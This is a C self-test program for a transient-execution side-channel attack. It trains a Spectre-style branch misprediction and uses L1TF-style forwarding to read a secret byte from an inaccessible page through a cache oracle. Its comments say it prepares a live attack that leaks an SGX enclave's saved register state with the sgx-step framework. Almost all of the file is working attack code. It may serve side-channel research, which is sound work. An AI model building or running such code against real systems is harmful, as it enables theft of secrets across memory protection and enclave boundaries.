/*
 *  Offline test of the ONE leg no other self-test touched: speculative read of a
 *  FAULTING page under branch misprediction, with forwarding of its L1-resident
 *  data -- root-free, no SGX. Settles two things at once (colleague #2's test 3):
 *
 *   (a) Forwarding leg: does the mispredicted-shadow read of a non-accessible
 *       page forward the cached byte on this i3-6100? (offline proxy for the live
 *       L1TF read of the non-present SSA alias.)
 *   (b) Warm-survival: the secret sits at page offset 0xfc0 -> L1 set 63, exactly
 *       the live GPRSGX group-C set. It is warmed once, then the FULL Kocher
 *       training (which touches the oracle across sets 0..63 incl. 63) runs before
 *       the attack read. If the secret still decodes, the training does NOT evict
 *       set 63 -- refuting the "training evicts the warm SSA" worry directly.
 *
 *  The secret page is mprotect(PROT_NONE) so the speculative read faults; the
 *  Kocher branch is architecturally not-taken (attack index is out of bounds), so
 *  the faulting read NEVER retires -> no SIGSEGV in the normal path. A guard
 *  handler counts any stray architectural fault (must stay 0).
 *
 *  Build: gcc -O2 -I$HOME/sgx-step selftest-mispredict3.c -o selftest-mispredict3
 *  Run:   ./selftest-mispredict3        (TRIES=100 default)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>

#define MP_SLOT_SIZE 0x1040
#include "mispredict_gadget.h"

#define LO_CLASSES 64
#define HI_CLASSES 4
#define ARRAY_LEN  1024

/* single definitions for the shared header's externs */
volatile long  mp_bound = 256;
uint8_t       *mp_array;
char *volatile mp_oracle;

char __attribute__((aligned(0x1000))) oracle_lo[MP_SLOT_SIZE * LO_CLASSES];
char __attribute__((aligned(0x1000))) oracle_hi[MP_SLOT_SIZE * HI_CLASSES];

static volatile int seg_faults = 0;
static sigjmp_buf jb;
static void segv(int s) { (void) s; seg_faults++; siglongjmp(jb, 1); }

int main(void)
{
    int tries = getenv("TRIES") ? atoi(getenv("TRIES")) : 100;
    if (tries < 1) tries = 1;

    cpu_set_t set; CPU_ZERO(&set); CPU_SET(1, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) { CPU_ZERO(&set); CPU_SET(0, &set); sched_setaffinity(0, sizeof(set), &set); }

    struct sigaction sa; memset(&sa, 0, sizeof(sa));
    sa.sa_handler = segv; sa.sa_flags = SA_NODEFER;
    sigaction(SIGSEGV, &sa, NULL);

    /* One 2-page region so the secret sits ABOVE mp_array -> malicious_x is
     * POSITIVE and >> mp_bound (else the branch is architecturally taken and the
     * PROT_NONE read really faults). Page 0 = training array (stays RW); page 1 =
     * the secret, byte at offset 0xfc0 -> set 63 (GPRSGX group C). */
    unsigned char *region = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) { perror("mmap"); return 1; }
    mp_array = region;
    for (int i = 0; i < ARRAY_LEN; i++) mp_array[i] = (uint8_t) i;

    unsigned char *spage = region + 0x1000;
    volatile unsigned char *secret = spage + 0xfc0;
    long malicious_x = (long)((intptr_t) secret - (intptr_t) mp_array);   /* = 0x1fc0 */
    int ssa_set = mp_set_of((void *) secret);

    printf("mispredict L1TF-leg test: tries=%d, secret set=%d (page off 0xfc0), oracle base_set=%d\n",
           tries, ssa_set, mp_set_of(oracle_lo));

    int ok = 0, fails = 0;
    for (int v = 0; v < 256; v++)
    {
        /* warm the secret line, then make the page non-accessible */
        if (mprotect(spage, 0x1000, PROT_READ | PROT_WRITE)) { perror("mprotect rw"); return 1; }
        *secret = (unsigned char) v;                 /* value now L1-resident, set 63 */
        (void) *secret;
        if (mprotect(spage, 0x1000, PROT_NONE)) { perror("mprotect none"); return 1; }

        int lo = 0, hi = 0;
        if (sigsetjmp(jb, 1) == 0) {
            lo = mp_leak_class(0, malicious_x, oracle_lo, LO_CLASSES, ssa_set, tries);
            hi = mp_leak_class(1, malicious_x, oracle_hi, HI_CLASSES, ssa_set, tries);
        }
        int rec = ((hi & 3) << 6) | (lo & 0x3f);
        if (rec == v) ok++;
        else {
            if (fails < 12)
                printf("  [FAIL] v=0x%02x (lo=%d hi=%d) -> 0x%02x\n", v, v & 0x3f, v >> 6, rec);
            fails++;
        }
    }
    printf("RESULT: %d/256 forwarded from a PROT_NONE page in set 63 via misprediction (%d fail); stray arch faults=%d\n",
           ok, fails, seg_faults);
    return 0;
}
